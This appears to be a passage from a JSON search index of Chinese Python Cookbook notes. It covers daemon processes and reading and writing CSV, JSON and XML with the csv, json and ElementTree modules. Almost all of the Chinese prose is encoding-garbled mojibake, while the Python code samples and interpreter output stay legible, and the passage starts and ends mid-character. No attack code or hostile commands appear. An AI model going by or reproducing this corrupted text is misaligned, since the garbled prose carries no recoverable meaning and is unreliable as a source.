è¿›ç¨‹ä¸ºé¦–é¢†ã€‚å®ƒä¼šè®¾ç½®è¿™ä¸ªå­è¿›ç¨‹ä¸ºæ–°çš„è¿›ç¨‹ç»„çš„é¦–é¢†ï¼Œå¹¶ç¡®ä¿ä¸ä¼šå†æœ‰æ§åˆ¶ç»ˆç«¯ã€‚å¦‚ æœè¿™äº›å¬ä¸Šå»å¤ªé­”å¹»ï¼Œå› ä¸ºå®ƒéœ€è¦å°†å®ˆæŠ¤è¿›ç¨‹åŒç»ˆç«¯åˆ†ç¦»å¼€å¹¶ç¡®ä¿ä¿¡å·æœºåˆ¶å¯¹å®ƒä¸èµ· ä½œç”¨ã€‚è°ƒç”¨ os.chdir() å’Œ os.umask(0) æ”¹å˜äº†å½“å‰å·¥ä½œç›®å½•å¹¶é‡ç½®æ–‡ä»¶æƒé™æ©ç ã€‚ä¿® æ”¹ç›®å½•é€šå¸¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ä½¿å¾—å®ƒä¸å†å·¥ä½œåœ¨è¢«å¯åŠ¨æ—¶çš„ç›®å½•ã€‚ å¦å¤–ä¸€ä¸ªè°ƒç”¨ os.fork() åœ¨è¿™é‡Œæ›´åŠ ç¥ç§˜ç‚¹ã€‚è¿™ä¸€æ­¥ä½¿å¾—å®ˆæŠ¤è¿›ç¨‹å¤±å»äº†è·å–æ–° çš„æ§åˆ¶ç»ˆç«¯çš„èƒ½åŠ›å¹¶ä¸”è®©å®ƒæ›´åŠ ç‹¬ç«‹ï¼ˆæœ¬è´¨ä¸Šï¼Œè¯¥ daemon æ”¾å¼ƒäº†å®ƒçš„ä¼šè¯é¦–é¢†ä½ä½ï¼Œ å› æ­¤å†ä¹Ÿæ²¡æœ‰æƒé™å»æ‰“å¼€æ§åˆ¶ç»ˆç«¯äº†ï¼‰ã€‚å°½ç®¡ä½ å¯ä»¥å¿½ç•¥è¿™ä¸€æ­¥ï¼Œä½†æ˜¯æœ€å¥½ä¸è¦è¿™ä¹ˆåšã€‚ ä¸€æ—¦å®ˆæŠ¤è¿›ç¨‹è¢«æ­£ç¡®çš„åˆ†ç¦»ï¼Œå®ƒä¼šé‡æ–°åˆå§‹åŒ–æ ‡å‡† I/O æµæŒ‡å‘ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶ã€‚ è¿™ä¸€éƒ¨åˆ†æœ‰ç‚¹éš¾æ‡‚ã€‚è·Ÿæ ‡å‡† I/O æµç›¸å…³çš„æ–‡ä»¶å¯¹è±¡çš„å¼•ç”¨åœ¨è§£é‡Šå™¨ä¸­å¤šä¸ªåœ°æ–¹è¢«æ‰¾åˆ° ï¼ˆsys.stdout, sys.__stdout__ ç­‰ï¼‰ã€‚ä»…ä»…ç®€å•çš„å…³é—­ sys.stdout å¹¶é‡æ–°æŒ‡å®šå®ƒæ˜¯è¡Œä¸ é€šçš„ï¼Œå› ä¸ºæ²¡åŠæ³•çŸ¥é“å®ƒæ˜¯å¦å…¨éƒ¨éƒ½æ˜¯ç”¨çš„æ˜¯ sys.stdout ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æ‰“å¼€äº†ä¸€ä¸ªå• ç‹¬çš„æ–‡ä»¶å¯¹è±¡ï¼Œå¹¶è°ƒç”¨ os.dup2() ï¼Œç”¨å®ƒæ¥ä»£æ›¿è¢« sys.stdout ä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ã€‚è¿™ æ ·ï¼Œsys.stdout ä½¿ç”¨çš„åŸå§‹æ–‡ä»¶ä¼šè¢«å…³é—­å¹¶ç”±æ–°çš„æ¥æ›¿æ¢ã€‚è¿˜è¦å¼ºè°ƒçš„æ˜¯ä»»ä½•ç”¨äºæ–‡ ä»¶ç¼–ç æˆ–æ–‡æœ¬å¤„ç†çš„æ ‡å‡† I/O æµè¿˜ä¼šä¿ç•™åŸçŠ¶ã€‚ å®ˆæŠ¤è¿›ç¨‹çš„ä¸€ä¸ªé€šå¸¸å®è·µæ˜¯åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥è¿›ç¨‹ IDï¼Œå¯ä»¥è¢«å…¶ä»–ç¨‹åºåé¢ä½¿ç”¨ åˆ°ã€‚daemonize() å‡½æ•°çš„æœ€åéƒ¨åˆ†å†™äº†è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åœ¨ç¨‹åºç»ˆæ­¢æ—¶åˆ é™¤äº†å®ƒã€‚atexit. register() å‡½æ•°æ³¨å†Œäº†ä¸€ä¸ªå‡½æ•°åœ¨ Python è§£é‡Šå™¨ç»ˆæ­¢æ—¶æ‰§è¡Œã€‚ä¸€ä¸ªå¯¹äº SIGTERM çš„ ä¿¡å·å¤„ç†å™¨çš„å®šä¹‰åŒæ ·éœ€è¦è¢«ä¼˜é›…çš„å…³é—­ã€‚ä¿¡å·å¤„ç†å™¨ç®€å•çš„æŠ›å‡ºäº† SystemExit() å¼‚ å¸¸ã€‚æˆ–è®¸è¿™ä¸€æ­¥çœ‹ä¸Šå»æ²¡å¿…è¦ï¼Œä½†æ˜¯æ²¡æœ‰å®ƒï¼Œç»ˆæ­¢ä¿¡å·ä¼šä½¿å¾—ä¸æ‰§è¡Œ atexit.register() æ³¨å†Œçš„æ¸…ç†æ“ä½œçš„æ—¶å€™å°±æ€æ‰äº†è§£é‡Šå™¨ã€‚ä¸€ä¸ªæ€æ‰è¿›ç¨‹çš„ä¾‹å­ä»£ç å¯ä»¥åœ¨ç¨‹åºæœ€åçš„ stop å‘½ä»¤çš„æ“ä½œä¸­çœ‹åˆ°ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Concurrent-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Concurrent-programming.html"},{"title":"æ•°æ®ç¼–ç å’Œå¤„ç†","text":"ä¸»è¦è®¨è®ºä½¿ç”¨ Python å¤„ç†å„ç§ä¸åŒæ–¹å¼ç¼–ç çš„æ•°æ®ï¼Œæ¯”å¦‚ CSV æ–‡ä»¶ï¼Œ JSONï¼ŒXML å’ŒäºŒè¿›åˆ¶åŒ…è£…è®°å½•ã€‚ ä¸è®¨è®ºç‰¹æ®Šçš„ç®— æ³•é—®é¢˜ï¼Œè€Œæ˜¯å…³æ³¨äºæ€æ ·è·å–å’Œå­˜å‚¨è¿™äº›æ ¼å¼çš„æ•°æ®ã€‚ è¯»å†™ CSV æ•°æ® å¯¹äºå¤§å¤šæ•°çš„ CSV æ ¼å¼çš„æ•°æ®è¯»å†™é—®é¢˜ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ csv åº“ã€‚ä¾‹å¦‚:å‡è®¾ä½ åœ¨ä¸€ ä¸ªåå« stocks.csv æ–‡ä»¶ä¸­æœ‰ä¸€äº›è‚¡ç¥¨å¸‚åœºæ•°æ®ï¼Œå°±åƒè¿™æ ·: Symbol,Price,Date,Time,Change,Volume \"AA\",39.48,\"6/11/2007\",\"9:36am\",-0.18,181800 \"AIG\",71.38,\"6/11/2007\",\"9:36am\",-0.15,195500 \"AXP\",62.58,\"6/11/2007\",\"9:36am\",-0.46,935000 \"BA\",98.31,\"6/11/2007\",\"9:36am\",+0.12,104800 \"C\",53.08,\"6/11/2007\",\"9:36am\",-0.25,360900 \"CAT\",78.29,\"6/11/2007\",\"9:36am\",-0.23,225400 å¦‚ä½•å°†è¿™äº›æ•°æ®è¯»å–ä¸ºä¸€ä¸ªå…ƒç»„çš„åºåˆ—: import csv with open('stocks.csv') as f: f_csv = csv.reader(f) headers = next(f_csv) for row in f_csv: # Process row ... åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œrow ä¼šæ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚å› æ­¤ï¼Œä¸ºäº†è®¿é—®æŸä¸ªå­—æ®µï¼Œä½ éœ€è¦ä½¿ç”¨ä¸‹æ ‡ï¼Œ å¦‚ row[0] è®¿é—® Symbolï¼Œrow[4] è®¿é—® Changeã€‚ ç”±äºè¿™ç§ä¸‹æ ‡è®¿é—®é€šå¸¸ä¼šå¼•èµ·æ··æ·†ï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨å‘½åå…ƒç»„ã€‚ä¾‹å¦‚: from collections import namedtuple with open('stock.csv') as f: f_csv = csv.reader(f) headings = next(f_csv) Row = namedtuple('Row', headings) for r in f_csv: row = Row(*r) # Process row ... å®ƒå…è®¸ä½ ä½¿ç”¨åˆ—åå¦‚ row.Symbol å’Œ row.Change ä»£æ›¿ä¸‹æ ‡è®¿é—®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯è¿™ ä¸ªåªæœ‰åœ¨åˆ—åæ˜¯åˆæ³•çš„ Python æ ‡è¯†ç¬¦çš„æ—¶å€™æ‰ç”Ÿæ•ˆã€‚ å¦‚æœä¸æ˜¯çš„è¯ï¼Œä½ å¯èƒ½éœ€è¦ä¿®æ”¹ ä¸‹åŸå§‹çš„åˆ—å (å¦‚å°†éæ ‡è¯†ç¬¦å­—ç¬¦æ›¿æ¢æˆä¸‹åˆ’çº¿ä¹‹ç±»çš„)ã€‚ å¦å¤–ä¸€ä¸ªé€‰æ‹©å°±æ˜¯å°†æ•°æ®è¯»å–åˆ°ä¸€ä¸ªå­—å…¸åºåˆ—ä¸­å»ã€‚å¯ä»¥è¿™æ ·åš: import csv with open('stocks.csv') as f: f_csv = csv.DictReader(f) for row in f_csv: # process row ... åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨åˆ—åå»è®¿é—®æ¯ä¸€è¡Œçš„æ•°æ®äº†ã€‚æ¯”å¦‚ï¼Œrow['Symbol'] æˆ– è€… row['Change'] ä¸ºäº†å†™å…¥ CSV æ•°æ®ï¼Œä½ ä»ç„¶å¯ä»¥ä½¿ç”¨ csv æ¨¡å—ï¼Œä¸è¿‡è¿™æ—¶å€™å…ˆåˆ›å»ºä¸€ä¸ª writer å¯¹è±¡: headers = ['Symbol','Price','Date','Time','Change','Volume'] rows = [('AA', 39.48, '6/11/2007', '9:36am', -0.18, 181800), ('AIG', 71.38, '6/11/2007', '9:36am', -0.15, 195500), ('AXP', 62.58, '6/11/2007', '9:36am', -0.46, 935000), ] with open('stocks.csv','w') as f: f_csv = csv.writer(f) f_csv.writerow(headers) f_csv.writerows(rows) å¦‚æœä½ æœ‰ä¸€ä¸ªå­—å…¸åºåˆ—çš„æ•°æ®ï¼Œå¯ä»¥åƒè¿™æ ·åš: headers = ['Symbol', 'Price', 'Date', 'Time', 'Change', 'Volume'] rows = [{'Symbol':'AA', 'Price':39.48, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.18, 'Volume':181800}, {'Symbol':'AIG', 'Price': 71.38, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.15, 'Volume': 195500}, {'Symbol':'AXP', 'Price': 62.58, 'Date':'6/11/2007', 'Time':'9:36am', 'Change':-0.46, 'Volume': 935000}, ] with open('stocks.csv','w') as f: f_csv = csv.DictWriter(f, headers) f_csv.writeheader() f_csv.writerows(rows) ä½ åº”è¯¥æ€»æ˜¯ä¼˜å…ˆé€‰æ‹© csv æ¨¡å—åˆ†å‰²æˆ–è§£æ CSV æ•°æ®ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šåƒç¼–å†™ç±»ä¼¼ ä¸‹é¢è¿™æ ·çš„ä»£ç : with open('stocks.csv') as f: for line in f: row = line.split(',') # process row ... ä½¿ç”¨è¿™ç§æ–¹å¼çš„ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯ä½ ä»ç„¶éœ€è¦å»å¤„ç†ä¸€äº›æ£˜æ‰‹çš„ç»†èŠ‚é—®é¢˜ã€‚ æ¯”å¦‚ï¼Œå¦‚æœ æŸäº›å­—æ®µå€¼è¢«å¼•å·åŒ…å›´ï¼Œä½ ä¸å¾—ä¸å»é™¤è¿™äº›å¼•å·ã€‚ å¦å¤–ï¼Œå¦‚æœä¸€ä¸ªè¢«å¼•å·åŒ…å›´çš„å­—æ®µç¢° å·§å«æœ‰ä¸€ä¸ªé€—å·ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå› ä¸ºäº§ç”Ÿä¸€ä¸ªé”™è¯¯å¤§å°çš„è¡Œè€Œå‡ºé”™ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œcsv åº“å¯è¯†åˆ« Microsoft Excel æ‰€ä½¿ç”¨çš„ CSV ç¼–ç è§„åˆ™ã€‚è¿™æˆ–è®¸ä¹Ÿæ˜¯ æœ€å¸¸è§çš„å½¢å¼ï¼Œå¹¶ä¸”ä¹Ÿä¼šç»™ä½ å¸¦æ¥æœ€å¥½çš„å…¼å®¹æ€§ã€‚ ç„¶è€Œï¼Œå¦‚æœä½ æŸ¥çœ‹ csv çš„æ–‡æ¡£ï¼Œå°±ä¼š å‘ç°æœ‰å¾ˆå¤šç§æ–¹æ³•å°†å®ƒåº”ç”¨åˆ°å…¶ä»–ç¼–ç æ ¼å¼ä¸Š (å¦‚ä¿®æ”¹åˆ†å‰²å­—ç¬¦ç­‰)ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³ è¯»å–ä»¥ tab åˆ†å‰²çš„æ•°æ®ï¼Œå¯ä»¥è¿™æ ·åš: # Example of reading tab-separated values with open('stock.tsv') as f: f_tsv = csv.reader(f, delimiter='\\t') for row in f_tsv: # Process row ... å¦‚æœä½ æ­£åœ¨è¯»å– CSV æ•°æ®å¹¶å°†å®ƒä»¬è½¬æ¢ä¸ºå‘½åå…ƒç»„ï¼Œéœ€è¦æ³¨æ„å¯¹åˆ—åè¿›è¡Œåˆæ³•æ€§ è®¤è¯ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ª CSV æ ¼å¼æ–‡ä»¶æœ‰ä¸€ä¸ªåŒ…å«éæ³•æ ‡è¯†ç¬¦çš„åˆ—å¤´è¡Œï¼Œç±»ä¼¼ä¸‹é¢è¿™æ ·: Street Address,Num-Premises,Latitude,Longitude 5412 N CLARK,10,41.980262,-87.668452 è¿™æ ·æœ€ç»ˆä¼šå¯¼è‡´åœ¨åˆ›å»ºä¸€ä¸ªå‘½åå…ƒç»„æ—¶äº§ç”Ÿä¸€ä¸ª ValueError å¼‚å¸¸è€Œå¤±è´¥ã€‚ä¸ºäº†è§£ å†³è¿™é—®é¢˜ï¼Œä½ å¯èƒ½ä¸å¾—ä¸å…ˆå»ä¿®æ­£åˆ—æ ‡é¢˜ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·åœ¨éæ³•æ ‡è¯†ç¬¦ä¸Šä½¿ç”¨ ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢: import re with open('stock.csv') as f: f_csv = csv.reader(f) headers = [ re.sub('[&#94;a-zA-Z_]', '_', h) for h in next(f_csv) ] Row = namedtuple('Row', headers) for r in f_csv: row = Row(*r) # Process row ... è¿˜æœ‰é‡è¦çš„ä¸€ç‚¹éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œcsv äº§ç”Ÿçš„æ•°æ®éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œå®ƒä¸ä¼šåšä»»ä½• å…¶ä»–ç±»å‹çš„è½¬æ¢ã€‚ å¦‚æœä½ éœ€è¦åšè¿™æ ·çš„ç±»å‹è½¬æ¢ï¼Œä½ å¿…é¡»è‡ªå·±æ‰‹åŠ¨å»å®ç°ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ª åœ¨ CSV æ•°æ®ä¸Šæ‰§è¡Œå…¶ä»–ç±»å‹è½¬æ¢çš„ä¾‹å­: col_types = [str, float, str, str, float, int] with open('stocks.csv') as f: f_csv = csv.reader(f) headers = next(f_csv) for row in f_csv: # Apply conversions to the row items row = tuple(convert(value) for convert, value in zip(col_types, row)) ... å¦å¤–ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªè½¬æ¢å­—å…¸ä¸­ç‰¹å®šå­—æ®µçš„ä¾‹å­: print('Reading as dicts with type conversion') field_types = [ ('Price', float), ('Change', float), ('Volume', int) ] with open('stocks.csv') as f: for row in csv.DictReader(f): row.update((key, conversion(row[key])) for key, conversion in field_types) print(row) é€šå¸¸æ¥è®²ï¼Œä½ å¯èƒ½å¹¶ä¸æƒ³è¿‡å¤šå»è€ƒè™‘è¿™äº›è½¬æ¢é—®é¢˜ã€‚ åœ¨å®é™…æƒ…å†µä¸­ï¼ŒCSV æ–‡ä»¶éƒ½ æˆ–å¤šæˆ–å°‘æœ‰äº›ç¼ºå¤±çš„æ•°æ®ï¼Œè¢«ç ´åçš„æ•°æ®ä»¥åŠå…¶å®ƒä¸€äº›è®©è½¬æ¢å¤±è´¥çš„é—®é¢˜ã€‚ å› æ­¤ï¼Œé™¤é ä½ çš„æ•°æ®ç¡®å®æœ‰ä¿éšœæ˜¯å‡†ç¡®æ— è¯¯çš„ï¼Œå¦åˆ™ä½ å¿…é¡»è€ƒè™‘è¿™äº›é—®é¢˜ (ä½ å¯èƒ½éœ€è¦å¢åŠ åˆé€‚çš„ é”™è¯¯å¤„ç†æœºåˆ¶)ã€‚ æœ€åï¼Œå¦‚æœä½ è¯»å– CSV æ•°æ®çš„ç›®çš„æ˜¯åšæ•°æ®åˆ†æå’Œç»Ÿè®¡çš„è¯ï¼Œä½ å¯èƒ½éœ€è¦çœ‹ä¸€çœ‹ Pandas åŒ…ã€‚ Pandas åŒ…å«äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„å‡½æ•°å« pandas.read_csv() ï¼Œå®ƒå¯ä»¥åŠ è½½ CSV æ•°æ®åˆ°ä¸€ä¸ª DataFrame å¯¹è±¡ä¸­å»ã€‚ ç„¶ååˆ©ç”¨è¿™ä¸ªå¯¹è±¡ä½ å°±å¯ä»¥ç”Ÿæˆå„ç§å½¢å¼çš„ç»Ÿ è®¡ã€è¿‡æ»¤æ•°æ®ä»¥åŠæ‰§è¡Œå…¶ä»–é«˜çº§æ“ä½œäº†ã€‚ è¯»å†™ JSON æ•°æ® è¯»å†™ JSON(JavaScript Object Notation) ç¼–ç æ ¼å¼çš„æ•°æ®ã€‚ json æ¨¡å—æä¾›äº†ä¸€ç§å¾ˆç®€å•çš„æ–¹å¼æ¥ç¼–ç å’Œè§£ç  JSON æ•°æ®ã€‚ å…¶ä¸­ä¸¤ä¸ªä¸»è¦çš„å‡½ æ•°æ˜¯ json.dumps() å’Œ json.loads() ï¼Œè¦æ¯”å…¶ä»–åºåˆ—åŒ–å‡½æ•°åº“å¦‚ pickle çš„æ¥å£å°‘å¾—å¤šã€‚ ä¸‹é¢æ¼”ç¤ºå¦‚ä½•å°†ä¸€ä¸ª Python æ•°æ®ç»“æ„è½¬æ¢ä¸º JSON: import json data = { 'name' : 'ACME', 'shares' : 100, 'price' : 542.23 } json_str = json.dumps(data) å°†ä¸€ä¸ª JSON ç¼–ç çš„å­—ç¬¦ä¸²è½¬æ¢å›ä¸€ä¸ª Python æ•°æ®ç»“æ„: data = json.loads(json_str) å¦‚æœä½ è¦å¤„ç†çš„æ˜¯æ–‡ä»¶è€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä½ å¯ä»¥ä½¿ç”¨ json.dump() å’Œ json.load() æ¥ç¼–ç å’Œè§£ç  JSON æ•°æ® JSON ç¼–ç æ”¯æŒçš„åŸºæœ¬æ•°æ®ç±»å‹ä¸º None ï¼Œbool ï¼Œint ï¼Œfloat å’Œ str ï¼Œ ä»¥åŠåŒ…å« è¿™äº›ç±»å‹æ•°æ®çš„ listsï¼Œtuples å’Œ dictionariesã€‚ å¯¹äº dictionariesï¼Œkeys éœ€è¦æ˜¯å­—ç¬¦ä¸²ç±» å‹ (å­—å…¸ä¸­ä»»ä½•éå­—ç¬¦ä¸²ç±»å‹çš„ key åœ¨ç¼–ç æ—¶ä¼šå…ˆè½¬æ¢ä¸ºå­—ç¬¦ä¸²)ã€‚ ä¸ºäº†éµå¾ª JSON è§„ èŒƒï¼Œä½ åº”è¯¥åªç¼–ç  Python çš„ lists å’Œ dictionariesã€‚ è€Œä¸”ï¼Œåœ¨ web åº”ç”¨ç¨‹åºä¸­ï¼Œé¡¶å±‚å¯¹ è±¡è¢«ç¼–ç ä¸ºä¸€ä¸ªå­—å…¸æ˜¯ä¸€ä¸ªæ ‡å‡†åšæ³•ã€‚ JSON ç¼–ç çš„æ ¼å¼å¯¹äº Python è¯­æ³•è€Œå·²å‡ ä¹æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œé™¤äº†ä¸€äº›å°çš„å·®å¼‚ä¹‹ å¤–ã€‚ æ¯”å¦‚ï¼ŒTrue ä¼šè¢«æ˜ å°„ä¸º trueï¼ŒFalse è¢«æ˜ å°„ä¸º falseï¼Œè€Œ None ä¼šè¢«æ˜ å°„ä¸º nullã€‚ ä¸‹ é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæ¼”ç¤ºäº†ç¼–ç åçš„å­—ç¬¦ä¸²æ•ˆæœ: >>> json.dumps(False) 'false' >>> d = {'a': True, ... 'b': 'Hello', ... 'c': None} >>> json.dumps(d) '{\"b\": \"Hello\", \"c\": null, \"a\": true}' >>> å¦‚æœä½ è¯•ç€å»æ£€æŸ¥ JSON è§£ç åçš„æ•°æ®ï¼Œä½ é€šå¸¸å¾ˆéš¾é€šè¿‡ç®€å•çš„æ‰“å°æ¥ç¡®å®šå®ƒ çš„ç»“æ„ï¼Œ ç‰¹åˆ«æ˜¯å½“æ•°æ®çš„åµŒå¥—ç»“æ„å±‚æ¬¡å¾ˆæ·±æˆ–è€…åŒ…å«å¤§é‡çš„å­—æ®µæ—¶ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—® é¢˜ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ pprint æ¨¡å—çš„ pprint() å‡½æ•°æ¥ä»£æ›¿æ™®é€šçš„ print() å‡½æ•°ã€‚ å®ƒä¼šæŒ‰ ç…§ key çš„å­—æ¯é¡ºåºå¹¶ä»¥ä¸€ç§æ›´åŠ ç¾è§‚çš„æ–¹å¼è¾“å‡ºã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªæ¼”ç¤ºå¦‚ä½•æ¼‚äº®çš„æ‰“å°è¾“ å‡º Twitter ä¸Šæœç´¢ç»“æœçš„ä¾‹å­: >>> from urllib.request import urlopen >>> import json >>> u = urlopen('http://search.twitter.com/search.json?q=python&rpp=5') >>> resp = json.loads(u.read().decode('utf-8')) >>> from pprint import pprint >>> pprint(resp) {'completed_in': 0.074, 'max_id': 264043230692245504, 'max_id_str': '264043230692245504', 'next_page': '?page=2&max_id=264043230692245504&q=python&rpp=5', 'page': 1, 'query': 'python', 'refresh_url': '?since_id=264043230692245504&q=python', 'results': [{'created_at': 'Thu, 01 Nov 2012 16:36:26 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:14 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:13 +0000', 'from_user': ... }, {'created_at': 'Thu, 01 Nov 2012 16:36:07 +0000', 'from_user': ... } {'created_at': 'Thu, 01 Nov 2012 16:36:04 +0000', 'from_user': ... }], 'results_per_page': 5, 'since_id': 0, 'since_id_str': '0'} >>> ä¸€èˆ¬æ¥è®²ï¼ŒJSON è§£ç ä¼šæ ¹æ®æä¾›çš„æ•°æ®åˆ›å»º dicts æˆ– listsã€‚ å¦‚æœä½ æƒ³è¦åˆ›å»ºå…¶ä»– ç±»å‹çš„å¯¹è±¡ï¼Œå¯ä»¥ç»™ json.loads() ä¼ é€’ object_pairs_hook æˆ– object_hook å‚æ•°ã€‚ ä¾‹ å¦‚ï¼Œä¸‹é¢æ˜¯æ¼”ç¤ºå¦‚ä½•è§£ç  JSON æ•°æ®å¹¶åœ¨ä¸€ä¸ª OrderedDict ä¸­ä¿ç•™å…¶é¡ºåºçš„ä¾‹å­: >>> s = '{\"name\": \"ACME\", \"shares\": 50, \"price\": 490.1}' >>> from collections import OrderedDict >>> data = json.loads(s, object_pairs_hook=OrderedDict) >>> data OrderedDict([('name', 'ACME'), ('shares', 50), ('price', 490.1)]) >>> ä¸‹é¢æ˜¯å¦‚ä½•å°†ä¸€ä¸ª JSON å­—å…¸è½¬æ¢ä¸ºä¸€ä¸ª Python å¯¹è±¡ä¾‹å­: >>> class JSONObject: ... def __init__(self, d): ... self.__dict__ = d ... >>> >>> data = json.loads(s, object_hook=JSONObject) >>> data.name 'ACME' >>> data.shares 50 >>> data.price 490.1 >>> JSON è§£ç åçš„å­—å…¸ä½œä¸ºä¸€ä¸ªå•ä¸ªå‚æ•°ä¼ é€’ç»™ __init__() ã€‚ ç„¶ åï¼Œä½ å°±å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ä½¿ç”¨å®ƒäº†ï¼Œæ¯”å¦‚ä½œä¸ºä¸€ä¸ªå®ä¾‹å­—å…¸æ¥ç›´æ¥ä½¿ç”¨å®ƒã€‚ å¦‚æœä½ æƒ³è·å¾—æ¼‚äº®çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² åè¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨ json.dumps() çš„ indent å‚æ•°ã€‚ å¯¹è±¡å®ä¾‹é€šå¸¸å¹¶ä¸æ˜¯ JSON å¯åºåˆ—åŒ–çš„ã€‚ å¦‚æœä½ æƒ³åºåˆ—åŒ–å¯¹è±¡å®ä¾‹ï¼Œä½ å¯ä»¥æä¾›ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„è¾“å…¥æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œè¿”å›ä¸€ä¸ª å¯åºåˆ—åŒ–çš„å­—å…¸ã€‚ä¾‹å¦‚: def serialize_instance(obj): d = { '__classname__' : type(obj).__name__ } d.update(vars(obj)) return d å¦‚æœä½ æƒ³åè¿‡æ¥è·å–è¿™ä¸ªå®ä¾‹ï¼Œå¯ä»¥è¿™æ ·åš: # Dictionary mapping names to known classes classes = { 'Point' : Point } def unserialize_object(d): clsname = d.pop('__classname__', None) if clsname: cls = classes[clsname] obj = cls.__new__(cls) # Make instance without calling __init__ for key, value in d.items(): setattr(obj, key, value) return obj else: return d å¦‚ä½•ä½¿ç”¨è¿™äº›å‡½æ•°: >>> p = Point(2,3) >>> s = json.dumps(p, default=serialize_instance) >>> s '{\"__classname__\": \"Point\", \"y\": 3, \"x\": 2}' >>> a = json.loads(s, object_hook=unserialize_object) >>> a <__main__.Point object at 0x1017577d0> >>> a.x 2 >>> a.y 3 >>> è§£æç®€å•çš„ XML æ•°æ® å¯ä»¥ä½¿ç”¨ xml.etree.ElementTree æ¨¡å—ä»ç®€å•çš„ XML æ–‡æ¡£ä¸­æå–æ•°æ®ã€‚ ä¸ºäº†æ¼” ç¤ºï¼Œå‡è®¾ä½ æƒ³è§£æ Planet Python ä¸Šçš„ RSS æºã€‚ä¸‹é¢æ˜¯ç›¸åº”çš„ä»£ç : from urllib.request import urlopen from xml.etree.ElementTree import parse # Download the RSS feed and parse it u = urlopen('http://planet.python.org/rss20.xml') doc = parse(u) # Extract and output tags of interest for item in doc.iterfind('channel/item'): title = item.findtext('title') date = item.findtext('pubDate') link = item.findtext('link') print(title) print(date) print(link) print() xml.etree.ElementTree.parse() å‡½æ•°è§£ææ•´ä¸ª XML æ–‡æ¡£å¹¶å°†å…¶è½¬æ¢æˆä¸€ä¸ªæ–‡ æ¡£å¯¹è±¡ã€‚ ç„¶åï¼Œä½ å°±èƒ½ä½¿ç”¨ find() ã€iterfind() å’Œ findtext() ç­‰æ–¹æ³•æ¥æœç´¢ç‰¹å®šçš„ XML å…ƒç´ äº†ã€‚ è¿™äº›å‡½æ•°çš„å‚æ•°å°±æ˜¯æŸä¸ªæŒ‡å®šçš„æ ‡ç­¾åï¼Œ ä¾‹å¦‚ channel/item æˆ– title ã€‚ channel/item è¡¨ç¤º <channel> æ ‡ç­¾ä¸‹çš„ <item> æ ‡ç­¾ title è¡¨ç¤º <title> æ ‡ç­¾ ElementTree æ¨¡å—ä¸­çš„æ¯ä¸ªå…ƒç´ æœ‰ä¸€äº›é‡è¦çš„å±æ€§å’Œæ–¹æ³•ï¼Œåœ¨è§£æçš„æ—¶å€™éå¸¸æœ‰ ç”¨ã€‚ tag å±æ€§åŒ…å«äº†æ ‡ç­¾çš„åå­—ï¼Œtext å±æ€§åŒ…å«äº†å†…éƒ¨çš„æ–‡æœ¬ï¼Œè€Œ get() æ–¹æ³•èƒ½è·å– å±æ€§å€¼ã€‚ä¾‹å¦‚: >>> doc <xml.etree.ElementTree.ElementTree object at 0x101339510> >>> e = doc.find('channel/title') >>> e <Element 'title' at 0x10135b310> >>> e.tag 'title' >>> e.text 'Planet Python' >>> e.get('some_attribute') >>> æœ‰ä¸€ç‚¹è¦å¼ºè°ƒçš„æ˜¯ xml.etree.ElementTree å¹¶ä¸æ˜¯ XML è§£æçš„å”¯ä¸€æ–¹æ³•ã€‚ å¯¹äº æ›´é«˜çº§çš„åº”ç”¨ç¨‹åºï¼Œä½ éœ€è¦è€ƒè™‘ä½¿ç”¨ lxml ã€‚ å®ƒä½¿ç”¨äº†å’Œ ElementTree åŒæ ·çš„ç¼–ç¨‹æ¥ å£ï¼Œå› æ­¤ä¸Šé¢çš„ä¾‹å­åŒæ ·ä¹Ÿé€‚ç”¨äº lxmlã€‚ ä½ åªéœ€è¦å°†åˆšå¼€å§‹çš„ import è¯­å¥æ¢æˆ from lxml.etree import parse å°±è¡Œäº†ã€‚ lxml å®Œå…¨éµå¾ª XML æ 